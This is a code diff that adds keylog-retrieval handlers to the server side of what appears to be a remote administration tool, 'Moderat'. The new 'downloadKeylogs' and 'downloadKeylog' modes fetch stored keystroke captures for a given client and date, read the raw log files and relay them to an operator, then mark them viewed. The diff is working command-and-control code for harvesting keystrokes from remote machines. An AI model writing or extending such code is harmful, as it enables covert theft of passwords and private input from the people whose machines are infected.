@@ -305,6 +305,39 @@ class ModeratServerProtocol(Protocol):
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
 
+        # TODO: Download Keylogs
+        elif data['mode'] == 'downloadKeylogs':
+            client_id, date, filter_downloaded = data['payload'].split()
+            if int(filter_downloaded) == 1:
+                keylogs_list = manageKeylogs.get_all_new_keylogs(client_id, date)
+            else:
+                keylogs_list = manageKeylogs.get_all_keylogs(client_id, date)
+            if len(keylogs_list) > 0:
+                keylogs_names = []
+                for keylog in keylogs_list:
+                    if os.path.exists(keylog[3]):
+                        self.keylogs_dict[keylog[1]] = {}
+                        self.keylogs_dict[keylog[1]]['datetime'] = keylog[1]
+                        self.keylogs_dict[keylog[1]]['date'] = keylog[2]
+                        self.keylogs_dict[keylog[1]]['raw'] = open(keylog[3], 'rb').read()
+                        keylogs_names.append(keylog[1])
+                    else:
+                        log.info('File Not Found Delete Entry (%s)' % keylog[3])
+                        manageKeylogs.delete_keylog(keylog[1])
+                # Send Data Count
+                self.send_message_to_moderator(self, keylogs_names, len(keylogs_list))
+            else:
+                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
+
+        elif data['mode'] == 'downloadKeylog':
+            keylog_name = data['payload']
+            if self.keylogs_dict.has_key(keylog_name):
+                self.send_message_to_moderator(self, self.keylogs_dict[keylog_name], 'downloadKeylog')
+                manageKeylogs.set_keylog_viewed(self.keylogs_dict[keylog_name]['datetime'])
+                del self.keylogs_dict[keylog_name]
+            else:
+                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
+
         # ADMIN PRIVILEGES
         # Get Moderators List
         elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
